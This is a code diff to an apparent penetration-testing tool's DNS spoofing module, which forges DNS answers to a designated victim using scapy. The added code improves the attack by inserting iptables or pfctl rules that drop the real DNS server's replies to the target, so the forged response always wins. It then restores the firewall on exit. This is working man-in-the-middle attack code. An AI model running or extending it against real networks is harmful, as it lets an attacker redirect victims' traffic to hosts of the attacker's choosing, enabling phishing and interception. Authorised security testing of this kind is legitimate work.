@@ -14,11 +14,17 @@ permission to test.
 """
 import argparse
 import ipaddress
+import platform
+import os
+import subprocess
+import sys
+import tempfile
 
 from functools import partial
 from scapy.all import sniff, sendp
 from scapy.layers.dns import DNS, DNSRR
-from scapy.layers.inet import IP, IPv6, UDP
+from scapy.layers.inet import IP, UDP
+from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import Ether
 from scapy.packet import Packet
 
@@ -40,9 +46,9 @@ class DNSSpoof(BaseModule):
     ############################################################################
     # Class Level Attributes
     ############################################################################
-    NAME: str = "dns_spoof"
-    DESCRIPTION: str = "Performs DNS spoofing on a designated victim"
-    REQUIRES_ROOT: bool = True
+    NAME = "dns_spoof"
+    DESCRIPTION = "Performs DNS spoofing on a designated victim"
+    REQUIRES_ROOT = True
 
     DNS_FILTER = "udp and port 53"
     DNS_QUERY = 0
@@ -54,6 +60,10 @@ class DNSSpoof(BaseModule):
     def __init__(self, iface: str, output: OutputManager):
         super().__init__(iface, output)
         self._pkt_count = 0
+        self.LINUX = False
+        self.MAC = False
+        self._original_pf_rules = ''
+        self._temp_pf_path = ''
 
     ############################################################################
     # Abstract Required Methods
@@ -137,6 +147,7 @@ class DNSSpoof(BaseModule):
             args (argparse.Namespace): The parsed command-line arguments
                                     specific to the DNSSpoof module.
         """
+        self._determine_OS()
         prn = partial(self._process_packet, args=args)
         sniff_kwargs = {
             'iface': self.iface,
@@ -147,12 +158,14 @@ class DNSSpoof(BaseModule):
         }
 
         try:
+            self._block_dns_responses(args)
             msg = f"Sniffing for packets that are resolving {args.domain}"
             self.output.info(msg)
             sniff(**sniff_kwargs)
         except KeyboardInterrupt:
             self.output.warn("Keyboard interrupted, session has ceased")
         finally:
+            self._unblock_dns_responses(args)
             label = f"{'Packet' if self._pkt_count == 1 else 'Packets'}"
             msg = f"Total packets sniffed -> {self._pkt_count} {label}"
             self.output.info(msg)
@@ -286,3 +299,98 @@ class DNSSpoof(BaseModule):
                     self._pkt_count += 1
                 else:
                     return
+
+    def _block_dns_responses(self, args: argparse.Namespace) -> None:
+        """
+        Blocks real DNS server responses from reaching the target by applying
+        firewall rules on the host machine. On Linux uses iptables to drop
+        forwarded UDP packets from port 53 destined for the target. On macOS
+        saves the existing pf ruleset, writes a block rule to a temporary
+        file, loads it with pfctl, and enables pf. This prevents the real DNS
+        server from winning the race against the forged response.
+        Args:
+            args (argparse.Namespace): The parsed command-line arguments used
+                                    to access the target IP address.
+        """
+        if self.LINUX:
+            IP_TABLES_DROP_PKTS = [
+                'iptables', 
+                '-A', 'FORWARD', 
+                '-p', 'udp', 
+                '--sport', '53',
+                '-d', f'{args.target}',
+                '-j', 'DROP'
+            ]
+            subprocess.run(IP_TABLES_DROP_PKTS, capture_output=True)
+        elif self.MAC:
+            ENABLE_PF_CMD = ['pfctl', '-e']
+            SAVE_PF_RULES_CMD = ['pfctl', '-sr']
+            PF_DROP_PKTS_CMD = f"block drop out quick proto udp from any port 53 to {args.target}"
+
+            saved_pf_rules = subprocess.run(SAVE_PF_RULES_CMD, capture_output=True, text=True)
+            self._original_pf_rules = saved_pf_rules.stdout
+
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
+                f.write(PF_DROP_PKTS_CMD)
+                self._temp_pf_path = f.name
+
+            load_pf_rules_cmd = ['pfctl', '-f', f'{self._temp_pf_path}']
+            subprocess.run(load_pf_rules_cmd, capture_output=True)
+            subprocess.run(ENABLE_PF_CMD, capture_output=True)
+
+    def _unblock_dns_responses(self, args: argparse.Namespace) -> None:
+        """
+        Restores normal DNS traffic flow by removing the firewall rules applied
+        by _block_dns_responses(). On Linux removes the iptables DROP rule for
+        forwarded UDP packets from port 53 to the target. On macOS restores the
+        original pf ruleset if one existed before the module ran, otherwise
+        flushes all rules and disables pf. Cleans up any temporary files
+        created during the session. Called in the finally block of run() to
+        ensure cleanup always occurs on exit.
+        Args:
+            args (argparse.Namespace): The parsed command-line arguments used
+                                    to access the target IP address.
+        """
+        if self.LINUX:
+            IP_TABLES_RESTORE_PKTS = [
+                'iptables', 
+                '-D', 'FORWARD', 
+                '-p', 'udp', 
+                '--sport', '53',
+                '-d', f'{args.target}',
+                '-j', 'DROP'
+            ]
+            subprocess.run(IP_TABLES_RESTORE_PKTS, capture_output=True)
+        elif self.MAC:
+            FLUSH_DISABLE_PF_RULES_CMD = ['pfctl', '-F', 'all', '-d']
+            if self._original_pf_rules:
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
+                    f.write(self._original_pf_rules)
+                    restore_path = f.name
+
+                reload_orig_pf_rules_cmd = ['pfctl', '-f', f'{restore_path}']
+                subprocess.run(reload_orig_pf_rules_cmd, capture_output=True)
+                os.remove(restore_path)
+            else:
+                subprocess.run(FLUSH_DISABLE_PF_RULES_CMD, capture_output=True)
+            
+            if self._temp_pf_path and os.path.exists(self._temp_pf_path):
+                os.remove(self._temp_pf_path)
+
+    def _determine_OS(self) -> None:
+        """
+        Detects the current operating system and sets the corresponding instance
+        flag for use by the firewall methods. Sets self.LINUX to True on Linux
+        systems and self.MAC to True on macOS systems. Exits with an error if
+        the operating system is neither Linux nor macOS since firewall commands
+        differ per OS and unsupported systems cannot be handled safely.
+        """
+        system_os = platform.system()
+        if system_os == 'Linux':
+            self.LINUX = True
+        elif system_os == 'Darwin':
+            self.MAC = True
+        else:
+            msg = "You need to be on a valid Linux Distro or Mac OS system"
+            self.output.error(msg)
+            sys.exit(1)
